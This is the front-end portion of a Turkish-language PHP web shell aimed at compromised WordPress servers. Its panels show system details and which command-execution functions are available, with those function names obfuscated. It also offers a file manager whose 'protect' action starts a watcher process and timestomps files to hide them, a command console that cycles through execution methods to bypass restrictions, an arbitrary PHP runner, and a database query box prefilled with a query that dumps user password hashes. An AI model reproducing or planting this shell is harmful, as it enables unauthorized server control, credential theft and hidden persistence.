<div class="panel"><h3>Watchers</h3><table><thead><tr><th>File</th><th>PID</th><th>Type</th><th style="text-align:right;">Act</th></tr></thead><tbody><?php foreach(getWatchers() as $path => $info): ?><tr><td title="<?= $path ?>"><?= $info['filename'] ?></td><td style="color:#a371f7;"><?= $info['pid'] ?></td><td><small><?= $info['type'] ?></small></td><td style="text-align:right;"><a href="?stop_watch=<?= urlencode($path) ?>" class="btn btn-red" style="font-size:12px; padding:4px 10px;">STOP</a></td></tr><?php endforeach; ?></tbody></table></div>
<div style="max-width: 1050px; margin: 0 auto;">
    <div class="tabs">
        <a href="?action=info" class="<?= ($action=='info')?'active':'' ?>">📊 Sistem Bilgisi</a>
        <a href="?action=files" class="<?= ($action=='files'||$action=='delete'||$action=='protect')?'active':'' ?>">📁 Dosya Yöneticisi</a>
        <a href="?action=console" class="<?= ($action=='console')?'active':'' ?>">💻 Komut Çalıştır</a>
        <a href="?action=php" class="<?= ($action=='php')?'active':'' ?>">🐘 PHP Kodu</a>
        <a href="?action=wpdb" class="<?= ($action=='wpdb')?'active':'' ?>">🗄️ WP Veritabanı</a>
    </div>
    <div class="panel">
<?php
switch ($action) {
    case 'info': ?><h3>Sistem Bilgisi</h3><pre>Sunucu: <?= php_uname()."\n" ?>IP: <?= $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname())."\n" ?>Yazılım: <?= $_SERVER['SERVER_SOFTWARE']."\n" ?>Kullanıcı: <?= get_current_user()."\n" ?>Document Root: <?= $rootPath."\n" ?>Panel: <?= __FILE__."\n" ?>WordPress: <?= file_exists('wp-config.php')?'Evet':'Hayır'."\n" ?>File Shield: <?= $shieldActive?'🔒 Aktif':'🔓 Pasif'."\n" ?><?php if(file_exists('wp-includes/version.php')){ include 'wp-includes/version.php'; echo "WP Versiyon: ".($wp_version??'Bilinmiyor')."\n"; } ?></pre><h3>🛠️ Çalıştırma Metot Durumu</h3><pre><?= $func_sh ?>: <?= isAvailable($func_sh)?'✅':'❌'."\n" ?><?= $func_sy ?>: <?= isAvailable($func_sy)?'✅':'❌'."\n" ?><?= $func_ex ?>: <?= isAvailable($func_ex)?'✅':'❌'."\n" ?><?= $func_pt ?>: <?= isAvailable($func_pt)?'✅':'❌'."\n" ?><?= $func_po ?>: <?= isAvailable($func_po)?'✅':'❌'."\n" ?><?= $func_pp ?>: <?= isAvailable($func_pp)?'✅':'❌'."\n" ?><?= $func_pc ?>: <?= isAvailable($func_pc)?'✅':'❌'."\n" ?></pre><?php break;
    case 'protect': if(isset($_GET['file'])){$f=realpath($_GET['file']);if($f&&is_file($f)&&strpos($f,$rootPath)===0){$pid=deployWatcher($f);manualTimestomp($f,@$_SESSION['stealth_date']);$w=getWatchers();$w[realpath($f)]=['filename'=>basename($f),'pid'=>$pid,'type'=>'USER'];saveWatchers($w);$msg="🔒 Dosya korumaya alındı: ".basename($f);}else{$msg="❌ Geçersiz dosya!";}}$action='files';
    case 'delete': if(isset($_GET['file'])){$f=realpath($_GET['file']);if($f&&is_file($f)&&strpos($f,$rootPath)===0){if(@unlink($f)){$msg="🗑️ Dosya silindi: ".basename($f);}else{$msg="❌ Dosya silinemedi!";}}else{$msg="❌ Geçersiz dosya!";}}$action='files';
    case 'files':
        if(isset($_GET['edit'])){$ef=realpath($_GET['edit']);if($ef&&is_file($ef)&&strpos($ef,$rootPath)===0){$c=file_get_contents($ef);$p=substr(sprintf('%o',fileperms($ef)),-4);?>
        <div class="editor-panel"><h3>✏️ Dosya Düzenle: <?= htmlspecialchars(basename($ef)) ?></h3><form method="post"><input type="hidden" name="edit_file_path" value="<?= htmlspecialchars($ef) ?>"><textarea name="file_content" rows="20" style="width:100%;"><?= htmlspecialchars($c) ?></textarea><div class="flex-row" style="margin-top:8px;"><label>Yeni İzin (chmod):</label><input type="text" name="chmod_value" value="<?= $p ?>" style="width:70px;"><button type="submit" name="save_edit" class="btn btn-green">💾 Kaydet</button><a href="?action=files" class="btn btn-blue">İptal</a></div></form></div><?php }else{echo "<p style='color:#da3633;'>Geçersiz dosya!</p>";}}
        ?><h3>Dosya Yöneticisi</h3>
        <div class="breadcrumb"><span>📍</span><?php $cp=$_SESSION['upload_dir'];$parts=explode('/',trim($cp,'/'));$bp='';echo '<a href="?action=files&chdir=/">/</a>';foreach($parts as $i=>$part){$bp.='/'.$part;echo ' <a href="?action=files&chdir='.urlencode($bp).'">'.htmlspecialchars($part).'</a> /';}?><form method="post" style="display:inline-flex;gap:4px;align-items:center;margin-left:auto;"><input type="text" name="goto_dir" placeholder="Dizin yolu..." style="width:140px;font-size:12px;padding:5px;"><button class="btn btn-blue" style="padding:5px 10px;font-size:12px;">Git</button></form><a href="?goto_root=1" class="btn btn-blue" style="margin-left:4px;padding:5px 10px;font-size:12px;">🏠 ROOT</a><a href="?chdir=.." class="btn btn-blue" style="padding:5px 10px;font-size:12px;">⬅️ GERİ</a></div>
        <div style="margin-bottom:12px;display:flex;flex-wrap:wrap;gap:8px;align-items:center;"><form method="post" style="display:flex;gap:5px;align-items:center;"><input type="text" name="newdirname" placeholder="Yeni dizin" style="width:120px;padding:5px;font-size:12px;"><button class="btn btn-blue" style="padding:5px 10px;font-size:12px;">📁 Klasör Oluştur</button></form><form method="post" style="display:flex;gap:5px;align-items:center;"><input type="text" name="newfilename" placeholder="Yeni dosya" style="width:120px;padding:5px;font-size:12px;"><button class="btn btn-blue" style="padding:5px 10px;font-size:12px;">📄 Dosya Oluştur</button></form><form method="post" enctype="multipart/form-data" style="display:flex;gap:5px;align-items:center;"><input type="file" name="u" style="width:auto;padding:5px;font-size:12px;"><button class="btn btn-green" style="padding:5px 10px;font-size:12px;">⬆️ Yükle & Koru</button></form></div>
        <?php $wl=getWatchers(); ?><table><tr><th class="col-file">İsim</th><th class="col-size">Boyut</th><th class="col-perm">İzin</th><th class="col-date">Değiştirme</th><th class="col-act">İşlem</th></tr><?php $items=@array_diff(scandir($_SESSION['upload_dir']),['.','..']);if($items):foreach($items as $i):$full=$_SESSION['upload_dir'].'/'.$i;$isDir=is_dir($full);$perm=substr(sprintf('%o',fileperms($full)),-4);$size=$isDir?'-':humanFilesize(filesize($full));$modTime=date("Y-m-d H:i:s",filemtime($full));$link=$isDir?"?action=files&chdir=".urlencode($i):"#";$name=$isDir?"<a href='$link' style='color:#f0883e;'>📁 $i</a>":htmlspecialchars($i);$actions='';if(!$isDir){$ep=urlencode($full);$rp=realpath($full);$ip=isset($wl[$rp]);$actions.="<div class='file-actions'>";$actions.="<a href='?action=files&edit=$ep' class='btn btn-blue'>✏️ Düzenle</a>";$actions.="<a href='?action=download&file=$ep' class='btn btn-green'>⬇️ İndir</a>";$actions.="<a href='?action=delete&file=$ep' class='btn btn-red'>🗑️ Sil</a>";if($ip){$actions.=" <span class='status-badge' style='background:var(--success);font-size:10px;padding:2px 6px;'>🛡️</span>";}else{$actions.=" <a href='?action=protect&file=$ep' class='btn btn-purple'>🔒 Koru</a>";}$actions.="</div>";}echo "<tr><td>$name</td><td>$size</td><td>$perm</td><td>$modTime</td><td class='col-act'>$actions</td></tr>";endforeach;endif;?></table><?php break;
    case 'console': ?><h3>Komut Çalıştır</h3><p style="color:var(--muted);font-size:12px;margin-bottom:8px;">ℹ️ Bypass modu aktif — tüm çalıştırma metotları sırayla deneniyor.</p><form method="post" class="flex-row"><input type="text" name="console_cmd" placeholder="ls -la /" style="flex:1;"><button class="btn btn-blue">Çalıştır</button></form><?php if(isset($console_output)): ?><pre><?= htmlspecialchars($console_output) ?></pre><?php endif; break;
    case 'php': ?><h3>PHP Kodu Çalıştır</h3><form method="post"><textarea name="php_code" rows="30" style="width:100%;"><?= htmlspecialchars($_POST['php_code'] ?? 'echo "Merhaba Dünya";') ?></textarea><button class="btn btn-green" style="margin-top:8px;">Çalıştır</button></form><?php if(isset($php_output)): ?><pre><?= htmlspecialchars($php_output) ?></pre><?php endif; break;
    case 'wpdb': ?><h3>WordPress Veritabanı</h3><?php if(include_wp_db()): ?><form method="post"><textarea name="wp_query" rows="5" style="width:100%;" placeholder="SELECT user_login,user_pass FROM wp_users;"><?= htmlspecialchars($_POST['wp_query'] ?? '') ?></textarea><button class="btn btn-blue" style="margin-top:8px;">Sorgula</button></form><?php if(isset($db_result)): ?><pre><?php print_r($db_result); ?></pre><?php endif; ?><?php else: ?><p style="color:#da3633;font-size:14px;">wp-config.php bulunamadı veya bağlantı kurulamadı.</p><?php endif; break;
}
?>
</div></div></body></html>